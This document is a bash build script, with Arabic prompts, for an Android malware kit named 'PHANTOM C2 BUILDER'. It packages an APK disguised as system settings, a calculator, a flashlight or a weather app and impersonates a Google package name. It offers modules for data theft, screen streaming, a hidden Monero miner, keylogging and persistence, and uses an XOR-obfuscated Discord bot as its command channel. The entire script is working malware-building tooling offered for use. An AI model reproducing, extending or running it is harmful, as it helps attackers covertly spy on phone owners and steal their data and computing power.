#!/bin/bash
# ╔══════════════════════════════════════════╗
# ║         PHANTOM C2 BUILDER v1.0         ║
# ║      Advanced Android C2 Framework      ║
# ╚══════════════════════════════════════════╝

set -e

BOLD='\033[1m'
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

PROJECT_DIR="$(cd "$(dirname "$0")/.." && pwd)"

logo() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════╗"
    echo "║         PHANTOM C2 BUILDER v1.0         ║"
    echo "║      Advanced Android C2 Framework      ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${RESET}"
    echo ""
}

# ── الخطوة 1: اختيار التصميم ──
select_design() {
    echo -e "${BOLD}[1/7] اختر تصميم التطبيق:${RESET}"
    echo "  1) ⚙️  System Settings  (الأكثر تمويهًا)"
    echo "  2) 🧮 Calculator        (طبيعي)"
    echo "  3) 🔦 Flashlight        (بسيط)"
    echo "  4) 🌤️  Weather           (يحتاج إنترنت)"
    echo ""
    read -p "  اختر [1-4] (default: 1): " design_choice
    
    case $design_choice in
        1) DESIGN="system_settings" ;;
        2) DESIGN="calculator" ;;
        3) DESIGN="flashlight" ;;
        4) DESIGN="weather" ;;
        *) DESIGN="system_settings" ;;
    esac
    echo -e "  ${GREEN}✓ التصميم: $DESIGN${RESET}"
    echo ""
}

# ── الخطوة 2: إصدار أندرويد ──
select_target() {
    echo -e "${BOLD}[2/7] اختر إصدار أندرويد المستهدف:${RESET}"
    echo "  1) Android 10  (API 29) - أوسع توافق"
    echo "  2) Android 11  (API 30)"
    echo "  3) Android 12  (API 31)"
    echo "  4) Android 13  (API 33)"
    echo "  5) Android 14  (API 34) - أحدث"
    echo ""
    read -p "  اختر [1-5] (default: 5): " target_choice
    
    case $target_choice in
        1) TARGET_SDK=29; MIN_SDK=29 ;;
        2) TARGET_SDK=30; MIN_SDK=29 ;;
        3) TARGET_SDK=31; MIN_SDK=29 ;;
        4) TARGET_SDK=33; MIN_SDK=29 ;;
        5) TARGET_SDK=34; MIN_SDK=34 ;;
        *) TARGET_SDK=34; MIN_SDK=34 ;;
    esac
    echo -e "  ${GREEN}✓ المستهدف: Android $((TARGET_SDK - 19)) (API $TARGET_SDK)${RESET}"
    echo ""
}

# ── الخطوة 3: الميزات ──
select_features() {
    echo -e "${BOLD}[3/7] اختر الميزات:${RESET}"
    echo ""
    
    FEATURES=()
    
    read -p "  [Y/n] Grabber (سرقة البيانات): " f
    [[ "${f,,}" != "n" ]] && FEATURES+=("grabber")
    
    read -p "  [Y/n] Streamer (بث الشاشة): " f
    [[ "${f,,}" != "n" ]] && FEATURES+=("streamer")
    
    read -p "  [y/N] Miner (تعدين كريبتو): " f
    [[ "${f,,}" == "y" ]] && FEATURES+=("miner")
    
    read -p "  [y/N] Keylogger (تسجيل المفاتيح): " f
    [[ "${f,,}" == "y" ]] && FEATURES+=("keylogger")
    
    read -p "  [Y/n] Persistence (استمرار): " f
    [[ "${f,,}" != "n" ]] && FEATURES+=("persistence")
    
    echo -e "  ${GREEN}✓ الميزات: ${FEATURES[*]}${RESET}"
    echo ""
}

# ── الخطوة 4: إعدادات البوت ──
config_bot() {
    echo -e "${BOLD}[4/7] إعدادات Discord Bot:${RESET}"
    read -p "  Bot Token: " BOT_TOKEN
    read -p "  Channel ID: " CHANNEL_ID
    read -p "  Alerts Channel ID (اختياري): " ALERTS_CHANNEL_ID
    echo ""
}

# ── الخطوة 5: إعدادات التعدين ──
config_miner() {
    if [[ " ${FEATURES[*]} " =~ "miner" ]]; then
        echo -e "${BOLD}[5/7] إعدادات التعدين:${RESET}"
        read -p "  Monero Wallet Address: " MINER_WALLET
        read -p "  Mining Pool (default: pool.supportxmr.com:3333): " MINER_POOL
        read -p "  Max CPU % (default: 40): " MINER_CPU
        read -p "  Threads (default: 2): " MINER_THREADS
        echo ""
    fi
}

# ── الخطوة 6: اسم التطبيق ──
config_app() {
    echo -e "${BOLD}[6/7] إعدادات التطبيق:${RESET}"
    read -p "  App Name (يظهر على الجهاز, default: System Services): " APP_NAME
    APP_NAME="${APP_NAME:-System Services}"
    read -p "  Package Name (default: com.google.system): " PACKAGE_NAME
    PACKAGE_NAME="${PACKAGE_NAME:-com.google.system}"
    echo ""
}

# ── الخطوة 7: التوقيع ──
config_signing() {
    echo -e "${BOLD}[7/7] إعدادات التوقيع:${RESET}"
    echo "  ملاحظة: سيتم استخدام debug keystore للتوقيع"
    echo "  للإنتاج، استخدم keystore خاص بك"
    echo ""
}

# ── البناء ──
build() {
    echo -e "${CYAN}╔══════════════════════════════════════════╗"
    echo "║          جاري البناء...                  ║"
    echo "╚══════════════════════════════════════════╝${RESET}"
    echo ""
    
    cd "$PROJECT_DIR"
    
    # 1. تحديث DiscordConfig.kt بالتوكن الجديد
    if [[ -n "$BOT_TOKEN" ]]; then
        echo -e "  ${YELLOW}[1/6]${RESET} تحديث DiscordConfig.kt"
        
        # XOR encode the token
        TOKEN_ENC=$(python3 -c "
token = '$BOT_TOKEN'
key = [161, 72, 45, 140, 148, 51, 230, 233, 184, 63, 60, 196, 164, 172, 85, 255]
enc = [ord(c) ^ key[i % len(key)] for i, c in enumerate(token)]
print(', '.join(str(x) for x in enc))
")
        
        # Update the TOKEN_ENC in DiscordConfig.kt
        python3 -c "
import re
with open('app/src/main/java/com/google/system/DiscordConfig.kt', 'r') as f:
    content = f.read()

new_enc = '''$TOKEN_ENC'''

# Replace the TOKEN_ENC list
pattern = r'private val TOKEN_ENC = listOf\(\s*[\d,\s]+\s*\)'
replacement = f'private val TOKEN_ENC = listOf(\n    {new_enc}\n)'
content = re.sub(pattern, replacement, content)

with open('app/src/main/java/com/google/system/DiscordConfig.kt', 'w') as f:
    f.write(content)
"
        echo -e "  ${GREEN}✓ Token updated${RESET}"
    fi
    
    # 2. تحديث plugins.json
    echo -e "  ${YELLOW}[2/6]${RESET} تحديث plugins.json"
    
    MINER_ENABLED="false"
    MINER_WALLET_VAL=""
    MINER_POOL_VAL="pool.supportxmr.com:3333"
    MINER_THREADS_VAL="2"
    MINER_CPU_VAL="40"
    
    [[ " ${FEATURES[*]} " =~ "grabber" ]] && GRABBER_ENABLED="true" || GRABBER_ENABLED="false"
    [[ " ${FEATURES[*]} " =~ "streamer" ]] && STREAMER_ENABLED="true" || STREAMER_ENABLED="false"
    [[ " ${FEATURES[*]} " =~ "miner" ]] && MINER_ENABLED="true"
    [[ " ${FEATURES[*]} " =~ "keylogger" ]] && KEYLOGGER_ENABLED="true" || KEYLOGGER_ENABLED="false"
    [[ " ${FEATURES[*]} " =~ "persistence" ]] && PERSISTENCE_ENABLED="true" || PERSISTENCE_ENABLED="false"
    
    [[ -n "$MINER_WALLET" ]] && MINER_WALLET_VAL="$MINER_WALLET"
    [[ -n "$MINER_POOL" ]] && MINER_POOL_VAL="$MINER_POOL"
    [[ -n "$MINER_THREADS" ]] && MINER_THREADS_VAL="$MINER_THREADS"
    [[ -n "$MINER_CPU" ]] && MINER_CPU_VAL="$MINER_CPU"
    
    cat > app/src/main/assets/plugins.json << EOF
{
  "grabber": { "enabled": $GRABBER_ENABLED, "version": "2.0" },
  "streamer": { "enabled": $STREAMER_ENABLED, "version": "1.0" },
  "miner": { "enabled": $MINER_ENABLED, "version": "1.0", "settings": {
    "wallet": "$MINER_WALLET_VAL",
    "pool": "$MINER_POOL_VAL",
    "threads": $MINER_THREADS_VAL,
    "max_cpu_percent": $MINER_CPU_VAL
  }},
  "keylogger": { "enabled": $KEYLOGGER_ENABLED, "version": "1.0" },
  "persistence": { "enabled": $PERSISTENCE_ENABLED, "version": "1.0" }
}
EOF
    echo -e "  ${GREEN}✓ Plugins configured${RESET}"
    
    # 3. تحديث bot .env
    if [[ -n "$BOT_TOKEN" && -n "$CHANNEL_ID" ]]; then
        echo -e "  ${YELLOW}[3/6]${RESET} تحديث discord-bot/.env"
        
        mkdir -p discord-bot
        cat > discord-bot/.env << EOF
DISCORD_TOKEN=$BOT_TOKEN
DISCORD_CLIENT_ID=1417665463277588521
ALERTS_CHANNEL_ID=${ALERTS_CHANNEL_ID:-}
ALLOWED_CHANNEL_ID=$CHANNEL_ID
EOF
        echo -e "  ${GREEN}✓ Bot config updated${RESET}"
    fi
    
    # 4. تحديث اسم التطبيق
    if [[ -n "$APP_NAME" ]]; then
        echo -e "  ${YELLOW}[4/6]${RESET} تحديث اسم التطبيق: $APP_NAME"
        
        STRINGS_FILE="app/src/main/res/values/strings.xml"
        if [[ -f "$STRINGS_FILE" ]]; then
            sed -i "s/<string name=\"app_name\">.*<\/string>/<string name=\"app_name\">$APP_NAME<\/string>/" "$STRINGS_FILE"
        fi
        echo -e "  ${GREEN}✓ App name updated${RESET}"
    fi
    
    # 5. Clean build
    echo -e "  ${YELLOW}[5/6]${RESET} تنظيف البناء السابق..."
    ./gradlew clean --quiet 2>/dev/null || true
    
    # 6. Build APK
    echo -e "  ${YELLOW}[6/6]${RESET} بناء APK..."
    ./gradlew assembleRelease
    
    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════╗"
    echo "║          ✓ تم البناء بنجاح!              ║"
    echo "╚══════════════════════════════════════════╝${RESET}"
    echo ""
    
    APK_PATH=$(find app/build/outputs/apk/release -name "*.apk" -type f 2>/dev/null | head -1)
    if [[ -n "$APK_PATH" ]]; then
        APK_SIZE=$(du -h "$APK_PATH" | cut -f1)
        echo -e "  📦 APK: $APK_PATH"
        echo -e "  📊 الحجم: $APK_SIZE"
        echo ""
    fi
}

# ── التشغيل ──
logo
select_design
select_target
select_features
config_bot
config_miner
config_app
config_signing
build
